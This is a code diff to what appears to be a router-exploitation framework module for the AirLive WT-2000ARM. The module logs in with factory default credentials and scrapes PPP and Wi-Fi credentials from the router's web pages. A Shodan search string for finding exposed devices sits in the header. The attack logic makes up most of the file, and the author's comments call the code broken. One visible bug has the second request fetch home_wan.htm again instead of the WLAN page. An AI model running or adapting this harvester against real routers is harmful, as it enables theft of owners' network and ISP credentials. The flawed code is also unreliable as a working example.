@@ -3,63 +3,66 @@
 #Author:Ján Trenčanský
 #License: GNU GPL v3
 #Created: 29.8.2013
-#Last modified: 1.9.2013
+#Last modified: 19.8.2015
 #Shodan Dork: WWW-Authenticate: Basic realm="AirLive WT-2000ARM
-#Description:
+#Description:This module is old, very very old, major refactoring is needed
+#Actually it's complete shit I'll have to rewrite it completly
+#TODO:Don't use it's broken
 
 #UI
 #WEP/WPA
-#DATABASE
 
-import httplib2
+import requests
+import requests.exceptions
 import re
 import core.Harvester
+from interface.messages import print_failed, print_success, print_red, print_green, print_warning, print_error
 
 
 class Harvester(core.Harvester.RextHarvester):
     #Default credentials and default IP of target ( ,() is there because of for cycle that goes through credentials)
     def __init__(self):  # need to fix passing credentials () breaks for cycle)
-        self.target = "192.168.1.1"
         self.credentials_list = (("admin", "airlive"), ())
         core.Harvester.RextHarvester.__init__(self)
 
     #Start method needs to be named do_* for nested interpreter
     def do_run(self, e):
-        http = httplib2.Http(".cache")
         for credentials in self.credentials_list:
             username = credentials[0]
             password = credentials[1]
-            http.add_credentials(username, password)
+            auth = (username, password)
             #Sending request
             try:
-                print("Connecting to " + self.target)
-                headers, body = http.request("http://"+self.target+"/basic/home_wan.htm")
-            except:
-                print("Connection error:Probably server timeout")
-                return -1
-            #Checks if authentication was successful
-            if headers.status == 200:
-                print("200:Authentication successful :)")
-                ppp_credentials = self.fetch_ppp(body)
-                print(ppp_credentials)
-                #Sending request for home_wlan
-                headers, body = http.request("http://"+self.target+"/basic/home_wlan.htm")
-                if headers.status == 200:
-                    wlan_credentials = self.fetch_wlan(body)
-                    print(wlan_credentials)
-                    return 1
+                print("Connecting to " + self.host)
+                response = requests.get("http://"+self.host+"/basic/home_wan.htm", auth=auth, timeout=60)
+                #headers, body = http.request("http://"+self.target+"/basic/home_wan.htm")
+                #Checks if authentication was successful
+                if response.status_code == 200:
+                    print("200:Authentication successful :)")
+                    ppp_credentials = self.fetch_ppp(response.text)
+                    print(ppp_credentials)
+                    #Sending request for home_wlan
+                    response = requests.get("http://"+self.host+"/basic/home_wan.htm", auth=auth, timeout=60)
+                    if response.status_code == 200:
+                        wlan_credentials = self.fetch_wlan(response.text)
+                        print(wlan_credentials)
+                        return 1
+                    else:
+                        print_error("Failed fetching home_wlan.html. Status code:"+response.status_code)
+                        return -1
+                elif response.status_code == 401:
+                    print("401:Authentication failed")
+                    continue
+                elif response.status_code == 404:
+                    print("404:Page does not exists")
+                    break
                 else:
-                    print("Connection lost: Failed fetching home_wlan.html. Status code:"+headers.status)
-                    return -1
-            elif headers.status == 401:
-                print("401:Authentication failed")
-                continue
-            elif headers.status == 404:
-                print("404:Page does not exists")
-                break
-            else:
-                print("Something went wrong here. Status code:"+headers.status)
-                break
+                    print("Something went wrong here. Status code:"+response.status_code)
+                    break
+            except requests.exceptions.Timeout:
+                print_error("Timeout!")
+            except requests.exceptions.ConnectionError:
+                print_error("No route to host")
         return 1  # this shouldn't happen
             
     def fetch_ppp(self, body):
